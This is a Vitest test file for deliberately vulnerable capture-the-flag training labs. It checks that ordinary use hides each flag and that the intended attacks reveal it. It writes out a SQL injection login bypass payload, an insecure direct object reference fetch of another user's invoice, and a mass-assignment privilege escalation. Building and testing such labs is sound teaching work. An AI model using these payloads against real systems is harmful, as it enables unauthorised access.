import { spawn, type ChildProcess } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { afterAll, describe, expect, it } from 'vitest';

/**
 * The labs are vulnerable on purpose. These tests prove the intended attack
 * works (a lab nobody can solve is a broken challenge) and that the honest path
 * does NOT reveal the flag (a lab that gives the flag away teaches nothing).
 */
const running: ChildProcess[] = [];
afterAll(() => {
  for (const p of running) p.kill();
});

async function lab(name: string, flag: string): Promise<string> {
  const child = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', `labs/${name}/server.mjs`], {
    env: { PATH: process.env.PATH, FLAG: flag, PORT: '0', HOST: '127.0.0.1' },
    stdio: ['ignore', 'pipe', 'inherit'],
  });
  running.push(child);
  const port = await new Promise<string>((resolve, reject) => {
    child.stdout.on('data', (d: Buffer) => {
      const m = /listening on (\d+)/.exec(d.toString());
      if (m?.[1]) resolve(m[1]);
    });
    child.on('exit', (code) => {
      reject(new Error(`lab exited with ${String(code)}`));
    });
  });
  return `http://127.0.0.1:${port}`;
}

const newFlag = () => `BASTION{${randomBytes(16).toString('hex')}}`;
const form = (fields: Record<string, string>) => ({
  method: 'POST',
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(fields).toString(),
});
const json = (body: unknown, token?: string) => ({
  method: 'POST',
  headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) },
  body: JSON.stringify(body),
});
const bearer = (token: string) => ({ headers: { authorization: `Bearer ${token}` } });

describe('labs refuse to start without a flag', () => {
  it.each(['sqli-login', 'idor-invoices', 'mass-assignment'])('%s', async (name) => {
    const child = spawn(process.execPath, [`labs/${name}/server.mjs`], { env: { PATH: process.env.PATH }, stdio: 'ignore' });
    expect(await new Promise((resolve) => child.on('exit', resolve))).toBe(1);
  });
});

describe('lab sqli-login', () => {
  it('the demo account sees no flag, guessing fails, SQL injection logs in as admin', async () => {
    const flag = newFlag();
    const base = await lab('sqli-login', flag);
    const demo = await fetch(`${base}/connexion`, form({ identifiant: 'stagiaire', mot_de_passe: 'stagiaire' }));
    expect(demo.status).toBe(200);
    expect(await demo.text()).not.toContain(flag);
    expect((await fetch(`${base}/connexion`, form({ identifiant: 'admin', mot_de_passe: 'admin' }))).status).toBe(401);

    const quote = await fetch(`${base}/connexion`, form({ identifiant: "'", mot_de_passe: 'x' }));
    expect(quote.status).toBe(500); // the verbose error leaks the query: the first clue
    expect(await quote.text()).toMatch(/SELECT identifiant, role FROM utilisateurs/);

    const injected = await fetch(`${base}/connexion`, form({ identifiant: "admin' -- ", mot_de_passe: 'x' }));
    expect(await injected.text()).toContain(flag);
  });
});

describe('lab idor-invoices', () => {
  it('my invoices list hides the others, but fetching one by id does not check the owner', async () => {
    const flag = newFlag();
    const base = await lab('idor-invoices', flag);
    expect((await fetch(`${base}/api/factures/1001`)).status).toBe(401);
    const { jeton } = (await (await fetch(`${base}/api/connexion`, json({ identifiant: 'alice', mot_de_passe: 'alice' }))).json()) as { jeton: string };
    const mine = await (await fetch(`${base}/api/mes-factures`, bearer(jeton))).text();
    expect(mine).not.toContain(flag);
    expect(mine).not.toContain('1001');
    const other = (await (await fetch(`${base}/api/factures/1001`, bearer(jeton))).json()) as { note: string };
    expect(other.note).toContain(flag);
  });
});

describe('lab mass-assignment', () => {
  it('a normal sign-up is refused the report; adding "role": "admin" to the body grants it', async () => {
    const flag = newFlag();
    const base = await lab('mass-assignment', flag);
    const normal = (await (await fetch(`${base}/api/inscription`, json({ email: 'a@lab.test', mot_de_passe: 'x' }))).json()) as {
      jeton: string;
      compte: { role: string };
    };
    expect(normal.compte.role).toBe('membre');
    expect((await fetch(`${base}/api/admin/rapport`, bearer(normal.jeton))).status).toBe(403);

    const evil = (await (await fetch(`${base}/api/inscription`, json({ email: 'm@lab.test', mot_de_passe: 'x', role: 'admin' }))).json()) as {
      jeton: string;
    };
    const report = (await (await fetch(`${base}/api/admin/rapport`, bearer(evil.jeton))).json()) as { flag: string };
    expect(report.flag).toBe(flag);
  });
});
